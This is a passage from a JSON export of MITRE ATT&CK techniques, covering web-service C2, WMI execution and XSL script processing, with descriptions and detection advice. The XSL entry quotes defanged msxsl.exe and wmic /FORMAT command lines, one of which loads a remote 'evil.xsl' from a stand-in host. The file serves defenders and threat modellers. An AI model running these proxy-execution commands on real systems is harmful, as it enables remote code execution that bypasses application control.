                "detection": "There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601). Some detection methods require vendor support to aid in investigation.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Network"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1102",
                "name": "Web Service",
                "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "url": "https://attack.mitre.org/techniques/T1102",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "Network Traffic: Network Connection Creation"
                ],
                "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1047",
                "name": "Windows Management Instrumentation",
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)",
                "url": "https://attack.mitre.org/techniques/T1047",
                "data_sources": [
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation"
                ],
                "detection": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1220",
                "name": "XSL Script Processing",
                "description": "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed �Squiblytwo�, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:�https[:]//example[.]com/evil[.]xsl�</code>",
                "url": "https://attack.mitre.org/techniques/T1220",
                "data_sources": [
                    "Process: Process Creation",
                    "Module: Module Load"
                ],
                "detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            }
        ]
    }
    });